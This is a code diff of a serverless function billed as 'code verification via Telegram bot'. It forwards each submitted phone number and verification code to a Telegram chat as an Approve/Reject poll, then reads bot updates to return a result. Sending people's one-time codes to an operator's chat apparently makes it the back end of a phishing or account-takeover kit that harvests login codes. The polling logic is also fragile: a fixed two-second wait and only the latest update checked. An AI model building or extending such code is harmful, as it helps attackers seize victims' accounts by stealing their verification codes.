@@ -1,4 +1,4 @@
-// Vercel serverless function for code verification via Telegram bot
+// Vercel serverless function for code verification via Telegram bot with poll
 export default async function handler(req, res) {
   // Enable CORS
   res.setHeader('Access-Control-Allow-Credentials', true);
@@ -25,7 +25,6 @@ export default async function handler(req, res) {
       return res.status(400).json({ error: 'Phone number and verification code are required' });
     }
 
-    // Replace with your actual Telegram bot token and chat ID
     const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
@@ -34,28 +33,64 @@ export default async function handler(req, res) {
       return res.status(500).json({ error: 'Server configuration error' });
     }
 
-    const message = `Code verification:\n📱 Phone: ${phoneNumber}\n🔐 Code: ${verificationCode}\n\n⚠️ Please reply with "APPROVE" or "REJECT"`;
-
-    const telegramResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    // Send poll to Telegram
+    const pollMessage = `Code verification request:\n📱 Phone: ${phoneNumber}\n🔐 Code: ${verificationCode}`;
+    
+    const pollResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPoll`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: message,
-        parse_mode: 'HTML'
+        question: pollMessage,
+        options: ['✅ Approve', '❌ Reject'],
+        is_anonymous: false,
+        allows_multiple_answers: false
       })
     });
 
-    if (!telegramResponse.ok) {
-      throw new Error('Failed to send message to Telegram');
+    if (!pollResponse.ok) {
+      throw new Error('Failed to send poll to Telegram');
     }
 
-    // For demo purposes, return a random approval/rejection
-    // In production, you'd implement a proper verification mechanism
-    // This could involve polling your bot's messages or using webhooks
-    const approved = Math.random() > 0.5; // Replace with actual logic
+    const pollData = await pollResponse.json();
+    const pollId = pollData.result.poll.id;
+
+    // Store the verification request with poll ID (in a real app, use a database)
+    // For now, we'll simulate waiting for the poll result
+    
+    // Wait for poll response (in production, use webhooks or polling)
+    // For demo purposes, we'll check for updates after a short delay
+    await new Promise(resolve => setTimeout(resolve, 2000));
+    
+    // Get updates to check poll results
+    const updatesResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
+    const updatesData = await updatesResponse.json();
+    
+    let approved = false;
+    
+    // Check if there's a poll answer in recent updates
+    if (updatesData.ok && updatesData.result.length > 0) {
+      const recentUpdates = updatesData.result.slice(-5); // Check last 5 updates
+      
+      for (const update of recentUpdates) {
+        if (update.poll_answer && update.poll_answer.poll_id === pollId) {
+          // Option 0 = Approve, Option 1 = Reject
+          approved = update.poll_answer.option_ids.includes(0);
+          break;
+        }
+      }
+    }
+
+    // If no poll answer found, return pending status
+    if (!approved && !updatesData.result.some(u => u.poll_answer?.poll_id === pollId)) {
+      return res.status(202).json({ 
+        status: 'pending',
+        message: 'Waiting for approval...',
+        pollId: pollId
+      });
+    }
 
     res.status(200).json({ approved });
   } catch (error) {
